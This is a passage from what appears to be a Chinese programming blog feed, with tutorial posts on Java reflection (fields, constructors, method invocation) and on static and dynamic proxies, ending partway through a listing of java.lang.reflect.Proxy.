&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] fields = personClass.getFields();<br>        <span class="hljs-keyword">for</span>(Field field : fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只会获取public属性的成员变量。（不会有任何回显，该方法不会直接获取所有成员变量）。</p><p>想要获取所有成员变量如下(有回显)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] declaredFields = personClass.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field declaredField : declaredFields)&#123;<br>            System.out.println(declaredField);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252130870.png" alt="QQ截图20220225212503"></p><p>给Person类赋值（这里采用的是<code>getField</code>,只能采用重新设置public属性赋值）<br>修改<code>person</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String a;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setA</span><span class="hljs-params">(String a)</span> &#123;<br>        <span class="hljs-built_in">this</span>.a = a;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, a=&#x27;&quot;</span> + a + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> a.get(person);<br>        System.out.println(o);<br>        a.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然也可以获取<code>private</code>属性的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> name.get(person);<br>        System.out.println(o);<br>        name.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里就不一一演示了。</p><h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(类 &lt;?&gt; … parameterTypes)</li><li>Constructor getDeclaredConstructors()</li><li>Constructor getDeclaredConstructor(类 &lt;?&gt; … parameterTypes)</li></ul><p><strong>记得给Person添加构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoConstruct</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;xsw6a&quot;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;harworking&quot;</span>);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//每一个构造方法的参数种类不一样，这一步是获取构造方法</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252200686.png" alt="QQ截图20220225220052"></p><p>如果是无参构造方法，可以直接使用Class类对象的newInstance方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> personClass.newInstance();<br>System.out.println(o);<br></code></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>Method[] getMethods()&#x2F;&#x2F;获取所有【public】修饰的方法，父类Object的方法也能看到</p></li><li><p>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</p></li><li><p>Method[] getDeclaredMethods()&#x2F;&#x2F;获取所有声明方法 不考虑修饰符 不考虑继承的方法</p></li><li><p>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes) 不考虑修饰符 不考虑继承的方法</p><p><strong>无参数类型。</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eat&quot;</span>);<span class="hljs-comment">//获取制定名称的方法</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">pp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-comment">//因为是空参方法，所以直接放进来一个对象就行</span><br>        <span class="hljs-comment">//执行方法，eat...</span><br>        eat.invoke(person);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>有参数类型</strong>（记得改person类）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218476.png" alt="QQ截图20220225221351"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethodTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eatCan&quot;</span>, String.class);<span class="hljs-comment">//eat方法重载，eat方法的需要传入的参数是String类型</span><br>        eat.invoke(person,<span class="hljs-string">&quot;水果&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不一一实现。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java两种代理</title>
    <link href="/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/"/>
    <url>/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h1><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>为不修改原先的类，而创建代理类去修改。</p><h3 id="用户接口"><a href="#用户接口" class="headerlink" title="用户接口"></a>用户接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServices</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;更新&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRealProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span> &#123;<br>    <span class="hljs-keyword">private</span> UserServices userServices; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserRealProxy</span><span class="hljs-params">(UserServices userServices)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userServices = userServices;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        before();<br>        userServices.select();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        before();<br>        userServices.update();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之前&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;在这之后&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>值得注意的点：</p><p>1、这里的<code>private UserServices userServices;</code>目的是规范话<code>userServices</code></p><p>2、构造函数，为了传入代理类。</p><h3 id="实现类-1"><a href="#实现类-1" class="headerlink" title="实现类"></a>实现类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServices</span> <span class="hljs-variable">userReal</span> <span class="hljs-operator">=</span> (UserServices) <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserReal</span>();<br>        <span class="hljs-type">UserRealProxy</span> <span class="hljs-variable">userRealProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRealProxy</span>(userReal);<br>        userRealProxy.select();<br>        userRealProxy.update();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045862.png" alt="QQ截图20220225145647"></p><p>代理类实现了不修改源代码而改变了输出结果（添加了在这之前与之后）。</p><p>但是实际应用中用到的静态代理很少很少。因为：</p><p>1、当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式：</p><ul><li>只维护一个代理类，由这个代理类实现多个接口，但是这样就导致<strong>代理类过于庞大</strong></li><li>新建多个代理类，每个目标对象对应一个代理类，但是这样会<strong>产生过多的代理类</strong></li></ul><p>2、当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，<strong>不易维护</strong>。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>首先要了解一个类和一个接口：</p><ul><li><code>java.lang.reflect.Proxy</code>（类）</li><li><code>java.lang.reflect.InvocationHandler</code>（接口）</li></ul><p><code>java.lang.reflect.Proxy</code>主要用于生成动态代理类Class、创建代理类实例，该类实现了<code>java.io.Serializable</code>接口。</p><p><strong>Proxy</strong>：是所有动态代理的父类，负责new一个实例。<br><strong>InvocationHandler</strong>：用于调用<code>Proxy</code>类生成的代理类方法，该类只有一个<code>Invoke</code>方法（代理对象要执行的功能代码）。并且每一个类都要实现<code>IncocationHandler</code>这个接口。</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>快捷键Ctrl+shift+f，搜索<code>public class Proxy implements java.io.Serializable</code>可找到该类。这里引用别的师傅的翻译。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">copypackage java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 